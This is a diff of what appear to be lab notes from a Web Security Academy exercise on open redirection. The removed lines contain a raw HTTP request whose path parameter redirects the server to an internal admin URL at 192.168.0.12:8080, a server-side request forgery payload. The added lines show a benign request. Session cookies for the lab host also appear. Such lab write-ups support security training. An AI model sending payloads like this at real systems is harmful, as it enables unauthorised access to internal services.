@@ -452,23 +452,23 @@ It is an application protocol used over an IP network to manage and access the d
  
  ## Request 
  
-     GET /product/nextProduct?currentProductId=1&path=/product/nextProduct?path=http://192.168.0.12:8080/admin HTTP/1.1
-Host: 0a7200c904d2e666c1d61b2400a3003e.web-security-academy.net
-Cookie: session=DEdve7zYbcqIWVlI14axA9iORWiX3Kfh; session=9zDJPWTSYtTJgdg4B48YKUfRL6nvUVeC
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: https://0a7200c904d2e666c1d61b2400a3003e.web-security-academy.net/product?productId=1
-Upgrade-Insecure-Requests: 1
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: same-origin
-Sec-Fetch-User: ?1
-Te: trailers
-Connection: close
+    GET /product/nextProduct?currentProductId=3&path=/product?productId=4 HTTP/1.1
+    Host: 0a7200c904d2e666c1d61b2400a3003e.web-security-academy.net
+    Cookie: session=DEdve7zYbcqIWVlI14axA9iORWiX3Kfh; session=9zDJPWTSYtTJgdg4B48YKUfRL6nvUVeC
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Referer: https://0a7200c904d2e666c1d61b2400a3003e.web-security-academy.net/product?productId=3
+    Upgrade-Insecure-Requests: 1
+    Sec-Fetch-Dest: document
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-User: ?1
+    Te: trailers
+    Connection: close
  
- 
+ Check The Header show open redirection 
  
  
  
